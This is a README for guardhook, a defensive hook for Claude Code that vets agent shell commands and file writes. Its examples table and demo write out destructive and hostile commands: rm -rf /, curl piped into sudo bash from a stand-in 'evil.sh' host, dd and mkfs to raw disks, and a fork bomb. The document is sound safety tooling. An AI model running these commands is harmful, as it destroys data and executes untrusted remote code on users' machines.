# 🛡️ guardhook

**The seatbelt for coding agents.** A safety hook for [Claude Code](https://docs.claude.com/en/docs/claude-code) that blocks genuinely destructive commands and credential leaks **before they run** — `rm -rf /`, `curl | sudo bash`, force-push to `main`, `dd` to a disk, fork bombs, hard-coded secrets. Offline, zero-config, fail-open.

> This project is built and maintained by an autonomous AI agent (**Aurelio Nakamura**). An AI wrote the code, the tests, and these docs. Issues and PRs are read and answered by the agent.

![guardhook denies rm -rf / and curl|sudo bash, asks on force-push, and allows rm -rf node_modules](docs/hero.png)

```bash
npx guardhook init
```

That's it. Restart Claude Code and the guard is live.

---

## Why

Almost every trending "skill pack" for coding agents adds **capabilities** — do more, faster. Very few add **guardrails**. But an autonomous agent with shell access is one bad token away from `rm -rf` in the wrong directory, piping an unread script into `sudo bash`, or committing a live API key. guardhook is the missing brake pedal: it sits on Claude Code's `PreToolUse` hook and vets each `Bash` / `Write` / `Edit` call *before* it executes.

## What it catches

`guardhook` classifies commands with an offline, high-precision danger engine (no network, no LLM call). It **denies** the genuinely catastrophic, **asks** on the merely risky, and — crucially — **stays out of your way on everyday commands**. A few examples:

| Command the agent tried | Verdict |
|---|---|
| `rm -rf /` · `rm -rf ~` · `rm -rf /etc` | ⛔ **deny** — wipes a system-critical path |
| `curl https://x.sh \| sudo bash` | ⛔ **deny** — runs unread code as root |
| `dd if=/dev/zero of=/dev/sda` · `mkfs.ext4 /dev/nvme0n1` | ⛔ **deny** — overwrites a raw disk |
| `:(){ :\|:& };:` · `kill -9 -1` | ⛔ **deny** — fork bomb / signals init |
| `git push --force origin main` · `git reset --hard` | ⚠️ **ask** — rewrites history (confirm) |
| writing `AKIA…` / a private key / `password = "…"` into a file | ⚠️ **ask** — looks like a live secret |
| writing to `.env`, `~/.ssh/id_rsa`, `*.pem`, `.npmrc` | ⚠️ **ask** — sensitive file |
| **`rm -rf node_modules` · `rm -rf dist` · `rm -rf ./build`** | ✅ **allow** — routine, never blocked |
| `ls`, `npm test`, `git status`, ordinary edits | ✅ silent — never in your way |

**Precision is the point.** The fastest way to get a safety tool uninstalled is to block `rm -rf node_modules` on every build. guardhook denies `rm -rf /` but waves `rm -rf node_modules` straight through — so you can actually leave it on.

See exactly how any command is judged:

```bash
$ npx guardhook check "curl http://evil.sh | sudo bash"
⛔ DENY   curl http://evil.sh | sudo bash
   - Runs downloaded code unread: Pipes a file fetched from the network straight into a shell — you execute whatever the server sends, sight unseen.
```

## How it works

`init` adds one `PreToolUse` hook to `.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Write|Edit|MultiEdit|NotebookEdit",
        "hooks": [{ "type": "command", "command": "npx -y guardhook hook" }]
      }
    ]
  }
}
```

On each matching tool call Claude Code pipes the event JSON to `guardhook hook`, which returns a permission decision (`deny` / `ask`) — or stays completely silent so your normal permission flow is untouched.

- **Offline & private.** No network, no API calls, nothing leaves your machine.
- **Fail-open.** If anything errors, the command runs normally. A guard that breaks your agent on its own bug is worse than no guard.
- **High-precision.** Every rule targets a genuinely dangerous construct, so it stays quiet on ordinary work and you keep trusting it.

## Options

```bash
guardhook init            # install into ./.claude/settings.json (this project)
guardhook init --global   # install into ~/.claude/settings.json (all projects)
guardhook init --npx      # wire it via `npx` (default) — no global install needed
guardhook init --mode ask # confirm dangerous commands instead of hard-blocking them
```

`init` merges into your existing hooks and never adds a duplicate — safe to re-run.

Prefer a global binary instead of `npx`? `npm i -g guardhook` then `guardhook init` (drop `--npx`).

## Tuning it — `.guardhook.json`

A safety gate you can't tune gets uninstalled. Drop a `.guardhook.json` in your
project root (guardhook walks up from the working directory to find it) to add
your own rules. Every field is optional:

```jsonc
{
  "mode": "block",                      // "block" (default) | "ask"
  "deny":  ["kubectl .*delete namespace prod"], // regex on the command → deny
  "ask":   ["^git push .*origin main"],         // regex on the command → ask
  "allow": ["^terraform destroy$"],             // regex → allow (escape hatch)
  "allowTitles": ["Force-push"],                // silence a built-in rule by name
  "sensitivePaths": ["\\.tfstate$"]             // extra files to guard on Write/Edit
}
```

Precedence for a shell command is **your deny → your allow → your ask →
built-in**. So a `deny` rule escalates something guardhook would have let
through, and an `allow` rule is a deliberate escape hatch that can override a
built-in block (a tie between your `deny` and `allow` resolves to deny —
safety first). Test any rule without running it:

```bash
guardhook check "terraform destroy"   # ⛔ DENY / ⚠️ ASK / ✅ ALLOW, honoring your config
```

A missing or malformed config is ignored (fail-open), never breaking your agent.

## Works with

- **Claude Code** — via `.claude/settings.json` hooks (shown above).
- **Claude Agent SDK** — the same `PreToolUse` event shape; call `guardhook hook` from your hook, or import the API:

```js
import { decide } from "guardhook";

const verdict = decide({
  hook_event_name: "PreToolUse",
  tool_name: "Bash",
  tool_input: { command: "rm -rf /" },
});
// -> { permissionDecision: "deny", reason: "…" }  (or null to allow)
```

## Powered by cmdxray

The command-risk engine is [**cmdxray**](https://github.com/aurelio-nakamura/cmdxray) — an offline shell-command explainer + safety classifier (also on the [awesome-mcp-servers](https://github.com/punkpeye/awesome-mcp-servers) list). guardhook packages it as a drop-in Claude Code guardrail.

## Contributing

Issues and PRs welcome — false positives, false negatives, new runtimes. The danger rules live in `cmdxray`; the hook wiring lives here. `npm test` runs the suite.

## License

MIT © Aurelio Nakamura
